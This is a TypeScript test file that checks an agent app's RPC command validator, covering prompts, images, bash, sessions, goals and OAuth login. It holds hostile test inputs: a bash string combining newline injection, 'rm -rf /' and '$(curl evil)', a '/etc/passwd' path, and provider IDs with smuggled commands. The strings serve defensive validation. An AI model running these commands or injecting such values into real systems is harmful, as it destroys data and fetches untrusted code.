import { describe, expect, it, vi } from 'vitest'
import { isThinkingLevel, validateRpcCommand } from '../../electron/main/agent-rpc/command-schema'

const passthrough = async (path: string) => path

function validate(command: unknown, validateSessionPath: (path: string) => Promise<string> = passthrough) {
  return validateRpcCommand(command, validateSessionPath)
}

const pngData = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10, 1, 2, 3]).toString('base64')
const jpegData = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0]).toString('base64')
const gifData = Buffer.from('GIF89a....', 'ascii').toString('base64')
const webpData = Buffer.concat([Buffer.from('RIFF', 'ascii'), Buffer.from([0, 0, 0, 0]), Buffer.from('WEBP', 'ascii')]).toString('base64')

describe('subagent RPC boundary', () => {
  it('allows subscriptions and registered-id transcript reads', async () => {
    await expect(validate({ type: 'get_subagents' })).resolves.toEqual({ type: 'get_subagents' })
    for (const level of ['off', 'progress', 'events']) await expect(validate({ type: 'set_subagent_subscription', level })).resolves.toEqual({ type: 'set_subagent_subscription', level })
    await expect(validate({ type: 'set_subagent_subscription', level: 'anything' })).rejects.toThrow()
    await expect(validate({ type: 'get_subagent_messages', subagentId: 'worker', fromByte: 42 })).resolves.toEqual({ type: 'get_subagent_messages', subagentId: 'worker', fromByte: 42 })
    for (const fromByte of [-1, 1.5, Infinity, '0']) await expect(validate({ type: 'get_subagent_messages', subagentId: 'worker', fromByte })).rejects.toThrow()
  })

  it('allows transcript reads by remembered session file and requires a selector', async () => {
    // 上游 resolveSessionFile:subagentId 優先,sessionFile 限白名單(此 session
    // 宣告過的子代理轉錄檔);schema 只做結構驗證,不碰檔案系統。
    await expect(validate({ type: 'get_subagent_messages', sessionFile: '/tmp/agents/worker.jsonl' })).resolves.toEqual({ type: 'get_subagent_messages', sessionFile: '/tmp/agents/worker.jsonl' })
    await expect(validate({ type: 'get_subagent_messages', subagentId: 'worker', sessionFile: '/tmp/agents/worker.jsonl', fromByte: 7 })).resolves.toEqual({ type: 'get_subagent_messages', subagentId: 'worker', sessionFile: '/tmp/agents/worker.jsonl', fromByte: 7 })
    await expect(validate({ type: 'get_subagent_messages' })).rejects.toThrow('get_subagent_messages requires subagentId or sessionFile')
    await expect(validate({ type: 'get_subagent_messages', fromByte: 0 })).rejects.toThrow('get_subagent_messages requires subagentId or sessionFile')
    for (const sessionFile of ['', 42, 'x'.repeat(4097)]) await expect(validate({ type: 'get_subagent_messages', sessionFile })).rejects.toThrow()
    await expect(validate({ type: 'get_subagent_messages', subagentId: 'worker', extra: true })).rejects.toThrow('command.extra is not supported')
  })

  it('allows cancel_subagent with a registered-id-shaped subagentId', async () => {
    await expect(validate({ type: 'cancel_subagent', subagentId: 'worker' })).resolves.toEqual({ type: 'cancel_subagent', subagentId: 'worker' })
    for (const subagentId of ['', 'x'.repeat(257), 42]) await expect(validate({ type: 'cancel_subagent', subagentId })).rejects.toThrow()
    await expect(validate({ type: 'cancel_subagent' })).rejects.toThrow()
    await expect(validate({ type: 'cancel_subagent', subagentId: 'worker', force: true })).rejects.toThrow('command.force is not supported')
  })

  it('allows steer_subagent with a bounded message', async () => {
    await expect(validate({ type: 'steer_subagent', subagentId: 'worker', message: 'Please refocus' })).resolves.toEqual({ type: 'steer_subagent', subagentId: 'worker', message: 'Please refocus' })
    await expect(validate({ type: 'steer_subagent', subagentId: 'worker', message: 'x'.repeat(32_000) })).resolves.toEqual({ type: 'steer_subagent', subagentId: 'worker', message: 'x'.repeat(32_000) })
    await expect(validate({ type: 'steer_subagent', subagentId: 'worker', message: 'x'.repeat(32_001) })).rejects.toThrow()
    for (const message of ['', 42]) await expect(validate({ type: 'steer_subagent', subagentId: 'worker', message })).rejects.toThrow()
    for (const subagentId of ['', 'x'.repeat(257)]) await expect(validate({ type: 'steer_subagent', subagentId, message: 'hi' })).rejects.toThrow()
    await expect(validate({ type: 'steer_subagent', subagentId: 'worker', message: 'hi', mode: 'all' })).rejects.toThrow('command.mode is not supported')
  })
})

describe('isThinkingLevel', () => {
  it('accepts Prime thinking levels and rejects anything else', () => {
    expect(isThinkingLevel('medium')).toBe(true)
    expect(isThinkingLevel('max')).toBe(true)
    expect(isThinkingLevel('auto')).toBe(true)
    expect(isThinkingLevel('')).toBe(false)
  })
})

describe('validateRpcCommand simple commands', () => {
  it('passes through argument-free commands and rejects extra keys', async () => {
    await expect(validate({ type: 'abort' })).resolves.toEqual({ type: 'abort' })
    await expect(validate({ type: 'get_commands' })).resolves.toEqual({ type: 'get_commands' })
    await expect(validate({ type: 'abort', force: true })).rejects.toThrow('command.force is not supported')
  })

  it('resolves the parent session of a new_session command through the path validator', async () => {
    const validateSessionPath = vi.fn(async (path: string) => `${path}/resolved`)
    await expect(validate({ type: 'new_session' })).resolves.toEqual({ type: 'new_session' })
    await expect(validate({ type: 'new_session', parentSession: '/sessions/a' }, validateSessionPath)).resolves.toEqual({ type: 'new_session', parentSession: '/sessions/a/resolved' })
    expect(validateSessionPath).toHaveBeenCalledWith('/sessions/a')
    await expect(validate({ type: 'new_session', parentSession: 7 })).rejects.toThrow('parentSession must be a string')
    await expect(validate({ type: 'get_state', parentSession: '/sessions/a' })).rejects.toThrow('command.parentSession is not supported')
  })

  it('rejects a non-object command, a missing type, and an unexposed type', async () => {
    await expect(validate('abort')).rejects.toThrow('command must be an object')
    await expect(validate({})).rejects.toThrow('command.type must be a string')
    await expect(validate({ type: '' })).rejects.toThrow('command.type is too short')
    await expect(validate({ type: 'shutdown' })).rejects.toThrow('RPC command shutdown is not exposed to the renderer')
  })
})

describe('validateRpcCommand prompts', () => {
  it('accepts prompt, steer, and follow_up messages', async () => {
    for (const type of ['prompt', 'steer', 'follow_up']) {
      await expect(validate({ type, message: 'hello' })).resolves.toEqual({ type, message: 'hello' })
    }
    await expect(validate({ type: 'prompt', message: '' })).rejects.toThrow('message is too short')
    await expect(validate({ type: 'prompt' })).rejects.toThrow('message must be a string')
    await expect(validate({ type: 'prompt', message: 'hi', unexpected: 1 })).rejects.toThrow('command.unexpected is not supported')
  })

  it('allows a streaming behavior only on prompt', async () => {
    await expect(validate({ type: 'prompt', message: 'hi', streamingBehavior: 'steer' })).resolves.toEqual({ type: 'prompt', message: 'hi', streamingBehavior: 'steer' })
    await expect(validate({ type: 'prompt', message: 'hi', streamingBehavior: 'followUp' })).resolves.toEqual({ type: 'prompt', message: 'hi', streamingBehavior: 'followUp' })
    await expect(validate({ type: 'prompt', message: 'hi', streamingBehavior: 'queue' })).rejects.toThrow('Invalid streamingBehavior')
    await expect(validate({ type: 'steer', message: 'hi', streamingBehavior: 'steer' })).rejects.toThrow('streamingBehavior is only valid for prompt')
  })

  it('accepts every supported image type and normalizes the attachment shape', async () => {
    const images = [
      { type: 'image', data: pngData, mimeType: 'image/png' },
      { type: 'image', data: jpegData, mimeType: 'IMAGE/JPEG' },
      { type: 'image', data: gifData, mimeType: 'image/gif' },
      { type: 'image', data: webpData, mimeType: 'image/webp' },
    ]
    await expect(validate({ type: 'prompt', message: 'look', images })).resolves.toEqual({ type: 'prompt', message: 'look', images })
  })

  it('rejects malformed image collections', async () => {
    const image = { type: 'image', data: pngData, mimeType: 'image/png' }
    await expect(validate({ type: 'prompt', message: 'look', images: image })).rejects.toThrow('images must be an array with at most 8 items')
    await expect(validate({ type: 'prompt', message: 'look', images: Array.from({ length: 9 }, () => image) })).rejects.toThrow('images must be an array with at most 8 items')
    await expect(validate({ type: 'prompt', message: 'look', images: ['png'] })).rejects.toThrow('images[0] must be an object')
    await expect(validate({ type: 'prompt', message: 'look', images: [{ ...image, extra: true }] })).rejects.toThrow('images[0].extra is not supported')
    await expect(validate({ type: 'prompt', message: 'look', images: [{ ...image, type: 'file' }] })).rejects.toThrow('images[0].type must be image')
    await expect(validate({ type: 'prompt', message: 'look', images: [{ ...image, mimeType: 'image/tiff' }] })).rejects.toThrow('Unsupported image type')
    await expect(validate({ type: 'prompt', message: 'look', images: [{ ...image, data: '' }] })).rejects.toThrow('images[0].data is too short')
  })

  it('rejects non-canonical base64 and payloads that do not match their MIME type', async () => {
    const image = (data: string, mimeType = 'image/png') => ({ type: 'prompt', message: 'look', images: [{ type: 'image', data, mimeType }] })
    await expect(validate(image('AAA'))).rejects.toThrow('canonical base64')
    await expect(validate(image('////'))).rejects.toThrow('does not match its MIME type')
    await expect(validate(image('QR=='))).rejects.toThrow('canonical base64')
    await expect(validate(image(gifData, 'image/png'))).rejects.toThrow('does not match its MIME type')
    await expect(validate(image(pngData, 'image/jpeg'))).rejects.toThrow('does not match its MIME type')
    await expect(validate(image(pngData, 'image/gif'))).rejects.toThrow('does not match its MIME type')
    await expect(validate(image(pngData, 'image/webp'))).rejects.toThrow('does not match its MIME type')
  })
})

describe('validateRpcCommand settings commands', () => {
  it('validates set_model', async () => {
    await expect(validate({ type: 'set_model', provider: 'openai', modelId: 'gpt-5' })).resolves.toEqual({ type: 'set_model', provider: 'openai', modelId: 'gpt-5' })
    await expect(validate({ type: 'set_model', provider: '', modelId: 'gpt-5' })).rejects.toThrow('provider is too short')
    await expect(validate({ type: 'set_model', provider: 'openai' })).rejects.toThrow('modelId must be a string')
  })

  it('validates set_thinking_level', async () => {
    await expect(validate({ type: 'set_thinking_level', level: 'high' })).resolves.toEqual({ type: 'set_thinking_level', level: 'high' })
    await expect(validate({ type: 'set_thinking_level', level: 'auto' })).resolves.toEqual({ type: 'set_thinking_level', level: 'auto' })
  })

  it('validates set_service_tier', async () => {
    await expect(validate({ type: 'set_service_tier', serviceTier: 'priority' })).resolves.toEqual({ type: 'set_service_tier', serviceTier: 'priority' })
    await expect(validate({ type: 'set_service_tier', serviceTier: 'flex' })).rejects.toThrow('Invalid service tier')
  })

  it('validates the steering and follow-up queue modes', async () => {
    await expect(validate({ type: 'set_steering_mode', mode: 'all' })).resolves.toEqual({ type: 'set_steering_mode', mode: 'all' })
    await expect(validate({ type: 'set_follow_up_mode', mode: 'one-at-a-time' })).resolves.toEqual({ type: 'set_follow_up_mode', mode: 'one-at-a-time' })
    await expect(validate({ type: 'set_follow_up_mode', mode: 'none' })).rejects.toThrow('Invalid queue mode')
  })

  it('validates compaction and retry toggles', async () => {
    await expect(validate({ type: 'compact' })).resolves.toEqual({ type: 'compact' })
    await expect(validate({ type: 'compact', customInstructions: 'keep the plan' })).resolves.toEqual({ type: 'compact', customInstructions: 'keep the plan' })
    await expect(validate({ type: 'compact', customInstructions: 'x'.repeat(32_001) })).rejects.toThrow('customInstructions is too long')
    await expect(validate({ type: 'set_auto_compaction', enabled: false })).resolves.toEqual({ type: 'set_auto_compaction', enabled: false })
    await expect(validate({ type: 'set_auto_retry', enabled: true })).resolves.toEqual({ type: 'set_auto_retry', enabled: true })
    await expect(validate({ type: 'set_auto_retry', enabled: 'yes' })).rejects.toThrow('enabled must be a boolean')
  })

  it('validates the user-driven bash command', async () => {
    await expect(validate({ type: 'bash', command: 'ls -la' })).resolves.toEqual({ type: 'bash', command: 'ls -la' })
    await expect(validate({ type: 'abort_bash' })).resolves.toEqual({ type: 'abort_bash' })

    // command 必填、非空、上限 64 KiB
    await expect(validate({ type: 'bash' })).rejects.toThrow('command must be a string')
    await expect(validate({ type: 'bash', command: 42 })).rejects.toThrow('command must be a string')
    await expect(validate({ type: 'bash', command: '' })).rejects.toThrow('command is too short')
    await expect(validate({ type: 'bash', command: 'x'.repeat(64 * 1024) })).resolves.toBeTruthy()
    await expect(validate({ type: 'bash', command: 'x'.repeat(64 * 1024 + 1) })).rejects.toThrow('command is too long')

    // 惡意 shell 內容(換行注入、命令替換、CRLF)原樣轉送:執行語意屬於
    // 上游的使用者 shell 與 JSONL transport,schema 不偽造過濾;canonical
    // JSON 序列化保證 transport 不破框。NUL byte 由 requireString 明確拒絕。
    const hostile = 'a\nrm -rf /; $(curl evil)\r\n"quoted"'
    await expect(validate({ type: 'bash', command: hostile })).resolves.toEqual({ type: 'bash', command: hostile })
    await expect(validate({ type: 'bash', command: 'a\0b' })).rejects.toThrow('contains a NUL byte')

    // 未知欄位拒絕:wire 沒有 excludeFromContext(cwd/images 同理),
    // 語意不符的欄位不得靜默放行。
    for (const extra of [{ excludeFromContext: true }, { cwd: '/tmp' }, { images: [] }]) {
      await expect(validate({ type: 'bash', command: 'ls', ...extra })).rejects.toThrow('is not supported')
    }
    // abort_bash 無參數;任何欄位拒絕。
    await expect(validate({ type: 'abort_bash', jobId: 'x' })).rejects.toThrow('is not supported')
  })
})

describe('validateRpcCommand session commands', () => {
  it('resolves a switch_session path through the validator', async () => {
    const validateSessionPath = vi.fn(async (path: string) => `${path}/resolved`)
    await expect(validate({ type: 'switch_session', sessionPath: '/sessions/b' }, validateSessionPath)).resolves.toEqual({ type: 'switch_session', sessionPath: '/sessions/b/resolved' })
    await expect(validate({ type: 'switch_session', sessionPath: 'x'.repeat(4097) })).rejects.toThrow('sessionPath is too long')
  })

  it('rejects a rejected session path', async () => {
    const validateSessionPath = vi.fn(async () => { throw new TypeError('sessionPath is not inside a project') })
    await expect(validate({ type: 'switch_session', sessionPath: '/etc/passwd' }, validateSessionPath)).rejects.toThrow('sessionPath is not inside a project')
  })

  it('validates native fork with an optional entryId and branch with a required entryId', async () => {
    // Upstream v18.12.6: fork without entryId forks the whole session.
    await expect(validate({ type: 'fork' })).resolves.toEqual({ type: 'fork' })
    await expect(validate({ type: 'fork', entryId: 'entry-1' })).resolves.toEqual({ type: 'fork', entryId: 'entry-1' })
    await expect(validate({ type: 'fork', entryId: 'entry 1' })).rejects.toThrow('entryId contains invalid characters')
    await expect(validate({ type: 'fork', entryId: 7 })).rejects.toThrow('entryId must be a string')
    await expect(validate({ type: 'fork', extra: true })).rejects.toThrow('command.extra is not supported')
    await expect(validate({ type: 'branch' })).rejects.toThrow('entryId must be a string')
    await expect(validate({ type: 'branch', entryId: 'entry-1' })).resolves.toEqual({ type: 'branch', entryId: 'entry-1' })
    await expect(validate({ type: 'branch', entryId: 'entry 1' })).rejects.toThrow('entryId contains invalid characters')
    await expect(validate({ type: 'branch', extra: 1 })).rejects.toThrow('command.extra is not supported')
  })

  it('exposes the renamed branch-message listing and not the legacy fork alias', async () => {
    await expect(validate({ type: 'get_branch_messages' })).resolves.toEqual({ type: 'get_branch_messages' })
    await expect(validate({ type: 'get_fork_messages' })).rejects.toThrow('RPC command get_fork_messages is not exposed to the renderer')
  })

  it('exposes the read-only session tree without parameters', async () => {
    await expect(validate({ type: 'get_tree' })).resolves.toEqual({ type: 'get_tree' })
    await expect(validate({ type: 'get_tree', leafId: 'entry-1' })).rejects.toThrow('command.leafId is not supported')
    await expect(validate({ type: 'get_tree', sessionPath: '/tmp/sessions/a.jsonl' })).rejects.toThrow('command.sessionPath is not supported')
  })
  it('rejects removed cross-session and heartbeat commands before they reach an adapter', async () => {
    for (const type of ['send_message', 'observe', 'unobserve', 'set_heartbeat', 'update_heartbeat', 'manage_heartbeat']) {
      await expect(validate({ type } as never)).rejects.toThrow(`RPC command ${type} is not exposed to the renderer`)
    }
  })
})

describe('validateRpcCommand queue commands', () => {
  it('passes abort_and_restore_queue through without parameters', async () => {
    await expect(validate({ type: 'abort_and_restore_queue' })).resolves.toEqual({ type: 'abort_and_restore_queue' })
    await expect(validate({ type: 'abort_and_restore_queue', force: true })).rejects.toThrow('command.force is not supported')
  })

  it('validates remove_queued_message against a named queue', async () => {
    await expect(validate({ type: 'remove_queued_message', message: 'chip text', queue: 'steering' })).resolves.toEqual({ type: 'remove_queued_message', message: 'chip text', queue: 'steering' })
    await expect(validate({ type: 'remove_queued_message', message: 'chip text', queue: 'followUp' })).resolves.toEqual({ type: 'remove_queued_message', message: 'chip text', queue: 'followUp' })
    await expect(validate({ type: 'remove_queued_message', message: 'chip text', queue: 'follow_up' })).rejects.toThrow('queue must be steering or followUp')
    await expect(validate({ type: 'remove_queued_message', message: '', queue: 'steering' })).rejects.toThrow('message is too short')
    await expect(validate({ type: 'remove_queued_message', queue: 'steering' })).rejects.toThrow('message must be a string')
    await expect(validate({ type: 'remove_queued_message', message: 'chip text' })).rejects.toThrow('queue must be steering or followUp')
    await expect(validate({ type: 'remove_queued_message', message: 'chip text', queue: 'steering', extra: 1 })).rejects.toThrow('command.extra is not supported')
  })

  it('validates promote_queued_message', async () => {
    await expect(validate({ type: 'promote_queued_message', message: 'chip text' })).resolves.toEqual({ type: 'promote_queued_message', message: 'chip text' })
    await expect(validate({ type: 'promote_queued_message' })).rejects.toThrow('message must be a string')
    await expect(validate({ type: 'promote_queued_message', message: 'chip text', queue: 'steering' })).rejects.toThrow('command.queue is not supported')
  })

})

describe('validateRpcCommand extension UI responses', () => {
  it('accepts cancellations, confirmations, and values as mutually exclusive shapes', async () => {
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: true })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', cancelled: true })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', confirmed: false })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', confirmed: false })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', value: 'answer' })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', value: 'answer' })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, value: 'answer' })).rejects.toThrow('command.value is not supported')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', confirmed: true, cancelled: false })).rejects.toThrow('command.cancelled is not supported')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: false })).rejects.toThrow('command.cancelled is not supported')
    await expect(validate({ type: 'extension_ui_response', value: 'answer' })).rejects.toThrow('id must be a string')
  })

  it('accepts a strict ask-dialog answers variant and rejects malformed ones', async () => {
    const answers = [
      { id: 'q1', selectedOptions: ['Yes'] },
      { id: 'q2', selectedOptions: ['A', 'B'], customInput: 'note' },
    ]
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', answers })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: 'yes' })).rejects.toThrow('answers must be an array')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [{ id: 'q1', selectedOptions: 'Yes' }] })).rejects.toThrow('answers[0].selectedOptions must be an array')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [{ id: 7, selectedOptions: [] }] })).rejects.toThrow('answers[0].id must be a string')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [{ id: 'q1', selectedOptions: [true] }] })).rejects.toThrow('answers[0].selectedOptions[0] must be a string')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [{ id: 'q1', selectedOptions: [], customInput: 5 }] })).rejects.toThrow('answers[0].customInput must be a string')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [{ id: 'q1', selectedOptions: [], extra: 1 }] })).rejects.toThrow('answers[0].extra is not supported')
    // The ask variant is mutually exclusive with the value/confirmed shapes.
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', answers: [], value: 'x' })).rejects.toThrow('command.value is not supported')
  })

  it('accepts timedOut only as a boolean alongside cancelled', async () => {
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, timedOut: true })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, timedOut: true })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, timedOut: false })).resolves.toEqual({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, timedOut: false })
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: true, timedOut: 'yes' })).rejects.toThrow('timedOut must be a boolean')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', value: 'x', timedOut: true })).rejects.toThrow('command.timedOut is not supported')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', cancelled: false, timedOut: true })).rejects.toThrow('command.timedOut is not supported')
    await expect(validate({ type: 'extension_ui_response', id: 'ui-1', timedOut: true })).rejects.toThrow('command.timedOut is not supported')
  })
})

describe('validateRpcCommand goal', () => {
  it('accepts the argument-free lifecycle ops without extra keys', async () => {
    for (const op of ['get', 'resume', 'pause', 'drop'] as const) {
      await expect(validate({ type: 'goal', op })).resolves.toEqual({ type: 'goal', op })
      // objective / token_budget 僅 create 有意義,其餘 op 拒收
      await expect(validate({ type: 'goal', op, objective: 'x' })).rejects.toThrow('command.objective is not supported')
      await expect(validate({ type: 'goal', op, token_budget: 1000 })).rejects.toThrow('command.token_budget is not supported')
    }
    await expect(validate({ type: 'goal', op: 'get', extra: 1 })).rejects.toThrow('command.extra is not supported')
  })

  it('rejects missing and unknown ops', async () => {
    await expect(validate({ type: 'goal' })).rejects.toThrow('op must be a string')
    await expect(validate({ type: 'goal', op: '' })).rejects.toThrow('Invalid goal op')
    await expect(validate({ type: 'goal', op: 'complete' })).rejects.toThrow('Invalid goal op')
    await expect(validate({ type: 'goal', op: 'SET' })).rejects.toThrow('Invalid goal op')
  })

  it('requires a non-empty trimmed objective for create', async () => {
    await expect(validate({ type: 'goal', op: 'create', objective: 'fix the flaky tests' })).resolves.toEqual({ type: 'goal', op: 'create', objective: 'fix the flaky tests' })
    await expect(validate({ type: 'goal', op: 'create', objective: '  spaced goal  ' })).resolves.toEqual({ type: 'goal', op: 'create', objective: 'spaced goal' })
    await expect(validate({ type: 'goal', op: 'create' })).rejects.toThrow('objective must be a string')
    await expect(validate({ type: 'goal', op: 'create', objective: '   ' })).rejects.toThrow('objective is too short')
    await expect(validate({ type: 'goal', op: 'create', objective: 42 })).rejects.toThrow('objective must be a string')
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', extra: 1 })).rejects.toThrow('command.extra is not supported')
  })

  it('validates token_budget as an optional positive integer on create', async () => {
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: 50_000 })).resolves.toEqual({ type: 'goal', op: 'create', objective: 'x', token_budget: 50_000 })
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: 0 })).rejects.toThrow('token_budget must be a positive integer')
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: -5 })).rejects.toThrow('token_budget must be a positive integer')
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: 1.5 })).rejects.toThrow('token_budget must be a positive integer')
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: '50000' })).rejects.toThrow('token_budget must be a positive integer')
    await expect(validate({ type: 'goal', op: 'create', objective: 'x', token_budget: Number.MAX_SAFE_INTEGER + 1 })).rejects.toThrow('token_budget must be a positive integer')
  })
})

describe('validateRpcCommand OAuth login/logout', () => {
  // 上游 rpc-types.ts(v18.13.1)與 rpc.md 的 wire shape:
  // get_login_providers 無參、login/get_logout_accounts { providerId }、
  // logout { providerId, credentialId }。憑證歸屬 OMP custody(~/.omp
  // auth storage);schema 不放行任何祕密欄位通道。
  it('accepts get_login_providers as a parameter-free command and rejects extras', async () => {
    await expect(validate({ type: 'get_login_providers' })).resolves.toEqual({ type: 'get_login_providers' })
    await expect(validate({ type: 'get_login_providers', providerId: 'anthropic' })).rejects.toThrow('command.providerId is not supported')
    await expect(validate({ type: 'get_login_providers', token: 'x' })).rejects.toThrow('command.token is not supported')
  })

  it('accepts login and get_logout_accounts with a whitelisted providerId', async () => {
    for (const providerId of ['anthropic', 'openai-codex', 'github-copilot', 'google-gemini-cli', 'google_antigravity', 'google.antigravity', 'z.ai']) {
      await expect(validate({ type: 'login', providerId })).resolves.toEqual({ type: 'login', providerId })
      await expect(validate({ type: 'get_logout_accounts', providerId })).resolves.toEqual({ type: 'get_logout_accounts', providerId })
    }
    await expect(validate({ type: 'login', providerId: ' anthropic ' })).resolves.toEqual({ type: 'login', providerId: 'anthropic' })
    await expect(validate({ type: 'login', providerId: 'a'.repeat(128) })).resolves.toEqual({ type: 'login', providerId: 'a'.repeat(128) })
  })

  it('rejects malformed providerId values (no secrets, paths, or metacharacters)', async () => {
    for (const providerId of ['', 'a'.repeat(129), 'anthropic/..', '../etc', 'anthropic token', 'anthropic;rm', 'anthropic$HOME', '-leading', '中文字串', 'anthropic\nlogout', 42, null]) {
      await expect(validate({ type: 'login', providerId })).rejects.toThrow()
    }
    await expect(validate({ type: 'login' })).rejects.toThrow('providerId must be a string')
    // login 只攜帶 providerId:上游拒絕 RPC mode 的祕密/前置 URL 提示,schema 同樣不放行。
    await expect(validate({ type: 'login', providerId: 'anthropic', accessToken: 'sk-test' })).rejects.toThrow('command.accessToken is not supported')
    await expect(validate({ type: 'login', providerId: 'anthropic', url: 'https://auth.example/x' })).rejects.toThrow('command.url is not supported')
    await expect(validate({ type: 'get_logout_accounts', providerId: 'anthropic', credentialId: 1 })).rejects.toThrow('command.credentialId is not supported')
  })

  it('accepts logout with a positive-integer credentialId', async () => {
    await expect(validate({ type: 'logout', providerId: 'anthropic', credentialId: 1 })).resolves.toEqual({ type: 'logout', providerId: 'anthropic', credentialId: 1 })
    await expect(validate({ type: 'logout', providerId: 'openai-codex', credentialId: 900_719_925_474_091 })).resolves.toEqual({ type: 'logout', providerId: 'openai-codex', credentialId: 900_719_925_474_091 })
  })

  it('rejects malformed logout credentialId values', async () => {
    for (const credentialId of [0, -1, 1.5, NaN, Infinity, '3', null, undefined, Number.MAX_SAFE_INTEGER + 2]) {
      await expect(validate({ type: 'logout', providerId: 'anthropic', credentialId })).rejects.toThrow()
    }
    await expect(validate({ type: 'logout', credentialId: 3 })).rejects.toThrow('providerId must be a string')
    // logout 的 credentialId 綁定 OMP auth storage 的列編號;schema 不提供
    // 任何直接傳遞憑證內容的欄位。
    await expect(validate({ type: 'logout', providerId: 'anthropic', credentialId: 3, credential: 'sk-test' })).rejects.toThrow('command.credential is not supported')
    await expect(validate({ type: 'logout', providerId: 'anthropic' })).rejects.toThrow('credentialId must be a positive integer')
  })
})
